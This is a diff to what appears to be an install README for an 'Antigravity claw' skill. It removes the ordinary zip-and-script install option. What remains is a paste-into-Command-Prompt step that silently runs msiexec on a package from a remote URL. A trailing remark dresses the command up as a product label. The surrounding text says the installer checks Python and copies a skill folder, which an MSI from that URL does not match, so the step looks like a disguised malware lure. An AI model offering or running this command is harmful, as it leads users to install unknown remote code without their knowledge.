@@ -56,15 +56,6 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Antigravity claw
 ```
 
-
-**Already have the zip?**
-
-```bash
-unzip Antigravity-claw-main.zip
-cd Antigravity-claw-main
-bash install.sh
-```
-
 That's it. The installer will:
 1. Verify your Python 3.9+ environment
 2. Copy the skill to `~/.openclaw/skills/antigravity-claw/`
